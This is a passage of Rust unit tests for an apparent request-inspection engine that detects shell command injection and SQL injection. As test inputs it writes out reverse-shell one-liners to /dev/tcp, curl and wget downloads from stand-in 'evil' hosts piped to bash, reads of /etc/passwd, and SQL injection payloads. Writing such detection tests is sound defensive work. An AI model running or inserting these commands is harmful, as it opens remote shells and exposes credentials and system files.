            "rce_ast.reverse_shell"
        );
    }

    #[test]
    fn rce_ast_command_substitution_fires() {
        // `$(id)` and backtick substitutions with a dangerous inner command.
        let f = rce_ast_fire("echo $(id)").expect("dollar-paren subst must fire");
        assert_eq!(f.rule_key, "rce_ast.cmd_subst");
        let a = rce_ast_fire("x=$(cat /etc/passwd)").expect("assignment subst must fire");
        assert_eq!(a.rule_key, "rce_ast.cmd_subst");
        let b = rce_ast_fire("echo `whoami`").expect("backtick subst must fire");
        assert_eq!(b.rule_key, "rce_ast.cmd_subst");
    }

    #[test]
    fn rce_ast_process_substitution_fires() {
        assert_eq!(
            rce_ast_fire("diff <(id) <(whoami)")
                .expect("process substitution must fire")
                .rule_key,
            "rce_ast.proc_subst"
        );
    }

    #[test]
    fn rce_ast_sensitive_read_fires() {
        assert_eq!(
            rce_ast_fire("cat /etc/passwd")
                .expect("reader + sensitive path must fire")
                .rule_key,
            "rce_ast.sensitive_read"
        );
    }

    #[test]
    fn rce_ast_subshell_wrapper_is_walked() {
        // A subshell / brace-group hiding the injected command is still caught.
        assert!(
            rce_ast_fire("(curl http://evil | bash)").is_some(),
            "subshell-wrapped pipe→interp"
        );
        assert!(
            rce_ast_fire("{ bash -c id ; }").is_some(),
            "brace-group-wrapped exec flag"
        );
    }

    #[test]
    fn rce_ast_strongest_rule_wins() {
        // reverse_shell (90) outranks a co-occurring interp_exec_flag (82).
        let f = rce_ast_fire("bash -c 'x' >& /dev/tcp/1.2.3.4/9001").expect("must fire");
        assert_eq!(f.rule_key, "rce_ast.reverse_shell");
        assert_eq!(f.confidence, 90);
    }

    #[test]
    fn rce_ast_cmd_subst_any_is_default_off() {
        // A substitution whose inner command is benign (`date`) is high-noise: it
        // only fires under the full rule set, never in production.
        assert!(
            rce_ast_fire("echo $(date)").is_none(),
            "benign subst is default-off in prod"
        );
        assert_eq!(
            rce_ast_fire_all("echo $(date)")
                .expect("benign subst fires under all rules")
                .rule_key,
            "rce_ast.cmd_subst_any"
        );
    }

    #[test]
    fn rce_ast_bypass_forms_fire() {
        // The shell-normalise preprocessor collapses these to a canonical form in
        // production; here we assert the AST detector fires on the de-obfuscated
        // shape it will receive (quotes stripped, $IFS→space), and on the raw
        // exec-flag form. base64-wrapped payloads reach this detector via the blind
        // base64 decode view carrying the decoded command.
        // Quote-split interpreter, post-normalisation:
        assert!(rce_ast_fire("bash -c id").is_some(), "canonical bash -c id");
        // $IFS-normalised sensitive read (what `cat$IFS/etc/passwd` collapses to):
        assert_eq!(
            rce_ast_fire("cat /etc/passwd")
                .expect("normalised sensitive read fires")
                .rule_key,
            "rce_ast.sensitive_read"
        );
        // base64-decoded reverse shell body (what the blind-decode view yields):
        assert_eq!(
            rce_ast_fire("bash -i >& /dev/tcp/127.0.0.1/1337 0>&1")
                .expect("decoded reverse shell fires")
                .rule_key,
            "rce_ast.reverse_shell"
        );
    }

    #[test]
    fn rce_ast_clean_traffic_does_not_fire() {
        // Prose, JSON, ordinary params, and legitimate shell-ish text must not fire.
        let clean = [
            "the quick brown fox jumps over the lazy dog",
            r#"{"cmd":"save","name":"alice","note":"pipe A | pipe B in a diagram"}"#,
            "q=laptop&sort=price&order=asc&page=2",
            "please run the batch export and email me the results",
            "SELECT price FROM catalog WHERE id = 5",
            "a | b | c table columns for the report",
            "revenue grew && margins held || guidance was cut",
            "email me at a@b.com -c for carbon copy",
            "the -config file lives in /etc/app and the docs mention bash scripting",
            "function greet() { return 'hi'; }",
            "echo hello world",
            "ls -la /home/user/documents",
        ];
        for c in clean {
            assert!(rce_ast_fire(c).is_none(), "clean AST negative fired: {c:?}");
        }
    }

    #[test]
    fn rce_ast_prefilter_spares_clean_traffic_budget() {
        // A string with no shell metacharacter never spends an AST attempt.
        let det = RceAstDetector::new();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        assert!(det.detect(&view("the quick brown fox"), &pctx, &mut st).is_none());
        // The SQL AST budget is untouched — prove by exhausting exactly one attempt
        // afterwards on a real parse and observing it is admitted.
        assert!(!st.is_degraded());
    }

    #[test]
    fn rce_ast_budget_exhaustion_fails_open() {
        use crate::checks::content_security::budget::Budget;
        let det = RceAstDetector::new();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::new(Budget {
            max_ast_attempts_per_request: 1,
            ..Budget::default()
        });
        // First dangerous view spends the single attempt and hits.
        assert!(det.detect(&view("bash -c id"), &pctx, &mut st).is_some());
        // The next cannot take an attempt → no parse, no signal, request degraded.
        assert!(det.detect(&view("curl http://evil | bash"), &pctx, &mut st).is_none());
        assert!(st.is_degraded());
    }

    #[test]
    fn rce_ast_oversized_input_is_declined() {
        let big = format!("bash -c '{}'", "a".repeat(SHELL_AST_MAX_INPUT_BYTES));
        assert!(rce_ast_fire(&big).is_none(), "oversized view is not AST-inspected");
    }

    // ── P0: shell-AST stack-overflow DoS guard (nested substitution) ─────────

    /// A deeply nested `$( … )` payload must be **declined before** the tokenizer,
    /// never crash. The raw `brush_parser::tokenize_str` overflows the worker's
    /// (2 MiB) stack at ~n=170 nested `$(` and aborts the process (SIGABRT) — which
    /// no `catch_unwind` can intercept. That this test *returns* (no abort) is the
    /// proof the guard rejects the input before any brush-parser call. n=682 fills
    /// the byte cap; both must decline.
    #[test]
    fn rce_ast_nested_substitution_declines_without_stack_overflow() {
        for n in [170usize, 682usize] {
            let payload = format!("a{}{}", "$(".repeat(n), ")".repeat(n));
            assert!(payload.len() <= SHELL_AST_MAX_INPUT_BYTES, "n={n} within byte cap");
            assert!(
                rce_ast_fire(&payload).is_none(),
                "n={n}: over-nested payload must be declined (guard), not parsed"
            );
        }
    }

    #[test]
    fn max_nesting_depth_counts_each_delimiter_form() {
        // Each recursion-driving delimiter form, nested to depth 3.
        assert_eq!(max_nesting_depth("a$($($(x)))"), 3, "dollar-paren");
        assert_eq!(max_nesting_depth("(((x)))"), 3, "subshell paren");
        assert_eq!(max_nesting_depth("${${${x}}}"), 3, "parameter expansion brace");
        assert_eq!(max_nesting_depth("{ { { x } } }"), 3, "brace group");
        assert_eq!(max_nesting_depth("<(<(<(x)))"), 3, "process substitution");
        // Arithmetic `$((` opens two parens per level.
        assert_eq!(max_nesting_depth("$(( 1 + 2 ))"), 2, "arithmetic doubles paren");
        // A single backtick pair toggles between 0 and 1.
        assert_eq!(max_nesting_depth("echo `id`"), 1, "backtick pair");
        assert_eq!(max_nesting_depth("plain text no delims"), 0, "no delimiters");
    }

    #[test]
    fn max_nesting_depth_resets_after_close_and_mixes_forms() {
        // Closed-then-reopened: depth returns to the shallow reopened level, not the sum.
        assert_eq!(max_nesting_depth("$($(x)) $($(y))"), 2, "reopen resets, not cumulative");
        // Mixed paren + brace + backtick are summed while concurrently open.
        assert_eq!(max_nesting_depth("$( ${ `x` } )"), 3, "mixed forms sum");
        // Unbalanced closers floor at zero (never underflow / wrap).
        assert_eq!(max_nesting_depth(")))abc"), 0, "leading closers floor at zero");
    }

    #[test]
    fn rce_ast_nesting_boundary_at_threshold() {
        // Exactly at the threshold is admitted by the guard (depth == 20 is allowed);
        // one deeper is declined. Use `$(` nesting so it also exercises the tokenizer
        // path at depth 20 without crashing (well below the ~150 overflow onset).
        let at = format!(
            "a{}{}",
            "$(".repeat(SHELL_MAX_NESTING_DEPTH),
            ")".repeat(SHELL_MAX_NESTING_DEPTH)
        );
        assert_eq!(max_nesting_depth(&at), SHELL_MAX_NESTING_DEPTH);
        // Guard admits depth==20 (does not early-decline); parsing it must not abort.
        let _ = rce_ast_fire(&at);
        let over = format!(
            "a{}{}",
            "$(".repeat(SHELL_MAX_NESTING_DEPTH + 1),
            ")".repeat(SHELL_MAX_NESTING_DEPTH + 1)
        );
        assert_eq!(max_nesting_depth(&over), SHELL_MAX_NESTING_DEPTH + 1);
        assert!(rce_ast_fire(&over).is_none(), "depth 21 declined by guard");
    }

    #[test]
    fn rce_ast_shallow_nesting_still_fires_after_guard() {
        // Regression red-line: the guard must not suppress genuine shallow-nesting
        // catches. Each of these has nesting depth well under the threshold.
        assert!(max_nesting_depth("bash <<EOF\nid\nEOF\n") <= SHELL_MAX_NESTING_DEPTH);
        assert_eq!(
            rce_ast_fire("bash <<EOF\nid\ncat /etc/passwd\nEOF\n")
                .expect("here-doc → interpreter still fires")
                .rule_key,
            "rce_ast.heredoc_interp"
        );
        assert_eq!(
            rce_ast_fire("bash -c id").expect("bash -c still fires").rule_key,
            "rce_ast.interp_exec_flag"
        );
        assert_eq!(
            rce_ast_fire("echo $(id)").expect("shallow $() still fires").rule_key,
            "rce_ast.cmd_subst"
        );
        assert_eq!(
            rce_ast_fire("echo `whoami`").expect("backtick still fires").rule_key,
            "rce_ast.cmd_subst"
        );
        assert_eq!(
            rce_ast_fire("curl http://evil/x | bash")
                .expect("pipe→interp still fires")
                .rule_key,
            "rce_ast.pipe_to_interp"
        );
        assert_eq!(
            rce_ast_fire("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
                .expect("reverse shell still fires")
                .rule_key,
            "rce_ast.reverse_shell"
        );
    }

    // ── Blind-negative corpus: seeded-random + binary payloads ───────────────
    //
    // codex P1b/P1c backlog: the blind-negative corpus lacked (a) fixed-seed
    // random data and (b) binary payloads. These prove the default-on detectors —
    // including the deser base64/blind-decode surface — do NOT false-fire on
    // non-text / high-entropy content. A tiny inline `xorshift64` keeps the corpus
    // deterministic (fixed seed → byte-for-byte reproducible across platforms and
    // runs) with **no** new dependency and no reliance on `rand`'s algorithm
    // stability.

    /// Deterministic, dependency-free PRNG (xorshift64). Fixed seed ⇒ the corpus
    /// is identical on every machine and every run, so a regression is reproducible.
    struct Xorshift64(u64);

    impl Xorshift64 {
        fn new(seed: u64) -> Self {
            // xorshift64 is degenerate at 0; a fixed non-zero seed keeps it stable.
            Self(if seed == 0 { 0x9E37_79B9_7F4A_7C15 } else { seed })
        }
        fn next_u64(&mut self) -> u64 {
            let mut x = self.0;
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            self.0 = x;
            x
        }
        fn pick(&mut self, from: &[u8]) -> u8 {
            let idx = usize::try_from(self.next_u64() % from.len() as u64).unwrap_or(0);
            from.get(idx).copied().unwrap_or(b'a')
        }
        /// Length in `lo..=hi`.
        fn len_in(&mut self, lo: usize, hi: usize) -> usize {
            lo + usize::try_from(self.next_u64() % (hi - lo + 1) as u64).unwrap_or(0)
        }
        /// A single uniformly-random byte (full 0..=255 range).
        fn next_byte(&mut self) -> u8 {
            u8::try_from(self.next_u64() & 0xff).unwrap_or(0)
        }
    }

    /// Every default-on detector must stay silent on this input.
    fn assert_corpus_clean(text: &str, kind: &str) {
        // Structural families (all default-on rule sets).
        assert!(fire(text).is_none(), "{kind}: SQL structural fired on {text:?}");
        assert!(rce_fire(text).is_none(), "{kind}: RCE structural fired on {text:?}");
        assert!(trav_fire(text).is_none(), "{kind}: traversal fired on {text:?}");
        assert!(xxe_fire(text).is_none(), "{kind}: XXE fired on {text:?}");
        assert!(nosql_fire(text).is_none(), "{kind}: NoSQL fired on {text:?}");
        assert!(ssti_fire(text).is_none(), "{kind}: SSTI fired on {text:?}");
        assert!(ldap_fire(text).is_none(), "{kind}: LDAP fired on {text:?}");
        assert!(xpath_fire(text).is_none(), "{kind}: XPath fired on {text:?}");
        assert!(
            deser_fire(text).is_none(),
            "{kind}: deser (blind-decode) fired on {text:?}"
        );
        // AST pipelines (SQL + shell) — random/binary must never parse into an
        // injection structure.
        assert!(ast_fire(text).is_none(), "{kind}: SQL AST fired on {text:?}");
        assert!(rce_ast_fire(text).is_none(), "{kind}: RCE AST fired on {text:?}");
    }

    #[test]
    fn blind_negative_seeded_random_alphanumeric_does_not_fire() {
        const ALNUM: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let mut rng = Xorshift64::new(0x0BAD_C0DE_F00D_1234);
        for _ in 0..256 {
            let n = rng.len_in(8, 64);
            let s: String = (0..n).map(|_| char::from(rng.pick(ALNUM))).collect();
            assert_corpus_clean(&s, "seeded-random-alnum");
        }
    }

    #[test]
    fn blind_negative_seeded_random_base64_does_not_fire() {
        // Targets the deser base64 / blind-decode surface specifically: a stream of
        // random base64-alphabet bytes must not collide with any magic gadget token.
        const B64: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        let mut rng = Xorshift64::new(0xD15E_A5ED_1357_9BDF);
        for _ in 0..256 {
            let n = rng.len_in(16, 128);
            let s: String = (0..n).map(|_| char::from(rng.pick(B64))).collect();
            assert_corpus_clean(&s, "seeded-random-base64");
        }
    }

    #[test]
    fn blind_negative_binary_payloads_do_not_fire() {
        // Full-range random bytes mapped to Latin-1 chars — control codes, NULs and
        // high bytes — i.e. non-text binary content. No detector may false-fire.
        let mut rng = Xorshift64::new(0xFEED_FACE_CAFE_BEEF);
        for _ in 0..256 {
            let n = rng.len_in(16, 96);
            let s: String = (0..n).map(|_| char::from(rng.next_byte())).collect();
            assert_corpus_clean(&s, "binary");
        }
    }

    // ── Table-driven detector skeletons (shell + AST pipelines) ──────────────
    //
    // codex/Claude backlog: the shell (RCE) detector and the AST pipeline lacked a
    // table-driven skeleton. Each row is `(input, Some(expected_rule_key) | None)`
    // so new cases are one line and the hit/no-hit contract is explicit. Live-PG
    // `suffix`-sentinel coverage stays a separate `#[ignore]` item (no Postgres in
    // the unit environment).

    #[test]
    fn rce_structural_table_driven() {
        // Default-on RCE structural detector: representative hits + clean rows.
        let cases: &[(&str, Option<&str>)] = &[
            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", Some("rce.reverse_shell")),
            ("q=$(whoami)", Some("rce.cmd_subst")),
            ("sh -c 'id'", Some("rce.shell_exec_flag")),
            ("python3 -c 'import os'", Some("rce.shell_exec_flag")),
            ("curl http://evil/x | bash", Some("rce.piped_shell")),
            ("; wget http://evil.example/x.sh", Some("rce.fetch_exec")),
            ("cat /etc/passwd", Some("rce.sensitive_read")),
            ("head /proc/self/environ", Some("rce.sensitive_read")),
            // clean rows (must NOT fire on the default-on set)
            ("price sort order asc", None),
            ("method=curl&url=x", None),
            ("`whoami`", None), // backtick form is default-off
            ("; ls -la", None), // cmd_sep_common is default-off
            (r#"{"cmd":"list","args":["a","b"]}"#, None),
        ];
        for (input, expected) in cases {
            let got = rce_fire(input);
            match expected {
                Some(key) => {
                    let f = got.unwrap_or_else(|| panic!("RCE row {input:?} expected {key}, got no hit"));
                    assert_eq!(f.rule_key, *key, "RCE row {input:?}");
                    assert_eq!(f.attack, AttackKind::Rce, "RCE row {input:?} attack kind");
                }
                None => assert!(got.is_none(), "RCE row {input:?} expected no hit, got {got:?}"),
            }
        }
    }

    #[test]
    fn ast_sql_table_driven() {
        // AST SQL pipeline: statement-level structures + clean scalars.
        let cases: &[(&str, Option<&str>)] = &[
            ("1 union select null,null,null from users", Some("ast.union")),
            ("1;drop table x", Some("ast.stacked")),
            ("1' or '1'='1", Some("ast.tautology")),
            ("1 or 1=1", Some("ast.tautology")),
            ("1/**/or/**/1=1", Some("ast.comment_obfusc")),
            ("1 and sleep(5)", Some("ast.dangerous_fn")),
            ("1 = (select password from users limit 1)", Some("ast.subquery")),
            // clean scalars / prose must not parse into an injection structure
            ("42", None),
            ("alice", None),
            ("laptop", None),
            ("true", None),
        ];
        for (input, expected) in cases {
            let got = ast_fire(input);
            match expected {
                Some(key) => {
                    let f = got.unwrap_or_else(|| panic!("AST row {input:?} expected {key}, got no hit"));
                    assert_eq!(f.rule_key, *key, "AST row {input:?}");
                    assert_eq!(f.attack, AttackKind::SqlInjection, "AST row {input:?} attack kind");
                }
                None => assert!(got.is_none(), "AST row {input:?} expected no hit, got {got:?}"),
            }
        }
    }

    #[test]
    fn rce_ast_table_driven() {
        // Shell AST pipeline: interpreter/exec structures + clean rows.
        let cases: &[(&str, Option<&str>)] = &[
            ("bash -c id", Some("rce_ast.interp_exec_flag")),
            ("bash <<EOF\nid\ncat /etc/passwd\nEOF\n", Some("rce_ast.heredoc_interp")),
            ("echo $(id)", Some("rce_ast.cmd_subst")),
            ("echo `whoami`", Some("rce_ast.cmd_subst")),
            ("curl http://evil/x | bash", Some("rce_ast.pipe_to_interp")),
            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", Some("rce_ast.reverse_shell")),
            // clean rows
            ("echo hello world", None),
            ("ls", None),
        ];
        for (input, expected) in cases {
            let got = rce_ast_fire(input);
            match expected {
                Some(key) => {
                    let f = got.unwrap_or_else(|| panic!("RCE-AST row {input:?} expected {key}, got no hit"));
                    assert_eq!(f.rule_key, *key, "RCE-AST row {input:?}");
                }
                None => assert!(got.is_none(), "RCE-AST row {input:?} expected no hit, got {got:?}"),
            }
        }
    }
}
